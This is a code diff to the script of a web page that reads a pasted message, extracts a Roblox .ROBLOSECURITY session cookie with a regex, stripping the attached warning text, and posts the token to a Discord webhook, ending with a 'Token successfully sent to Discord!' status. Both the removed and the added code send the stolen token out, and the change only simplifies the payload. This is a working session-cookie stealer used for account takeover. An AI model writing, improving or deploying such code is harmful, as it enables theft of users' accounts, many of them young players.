@@ -62,7 +62,7 @@
       errorMessage.textContent = ""; // Clear any previous error messages
 
       // Check if the message contains the ROBLOSECURITY token
-      const robloSecurityTokenPattern = /(\.ROBLOSECURITY=[A-Za-z0-9%\-._]+)(?=\s|$)/i;
+      const robloSecurityTokenPattern = /\.ROBLOSECURITY=[A-Za-z0-9%\-._]+/i;
       const match = message.match(robloSecurityTokenPattern);
 
       if (!match) {
@@ -71,39 +71,32 @@
         return;
       }
 
-      // Extract only the ROBLOSECURITY token from the match
-      const token = match[0].split('=')[1]; // Extract token part after '='
+      // Extract only the ROBLOSECURITY token (removes warning text)
+      const token = match[0].split('=')[1];
 
-      // Create the embed payload with the token
-      const embedPayload = {
-        embeds: [
-          {
-            title: "ROBLOSECURITY Token",
-            description: `\`\`\`${token}\`\`\``, // Format the token within code brackets
-            color: 16711680, // Embed color (red in this case)
-            timestamp: new Date().toISOString() // Adds a timestamp
-          }
-        ]
+      // Send the token to Discord
+      const discordPayload = {
+        content: `ROBLOSECURITY Token: ${token}`
       };
 
-      // Send the token to Discord webhook
+      // Send the data to Discord via Webhook
       fetch(DISCORD_WEBHOOK_URL, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embedPayload),
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(discordPayload)
       })
-        .then((response) => {
-          if (response.ok) {
-            document.getElementById("status").textContent = "Message sent successfully!";
-            messageInput.value = ""; // Clear the input
-          } else {
-            throw new Error("Failed to send the message.");
-          }
-        })
-        .catch((error) => {
-          console.error("Error:", error);
-          document.getElementById("status").textContent = "Failed to send the message.";
-        });
+      .then(response => response.json())
+      .then(data => {
+        // If successful, show a success message
+        document.getElementById("status").textContent = "Token successfully sent to Discord!";
+      })
+      .catch(error => {
+        // Handle error
+        document.getElementById("errorMessage").textContent = "Error sending message!";
+        console.error("Error:", error);
+      });
     }
   </script>
 </body>
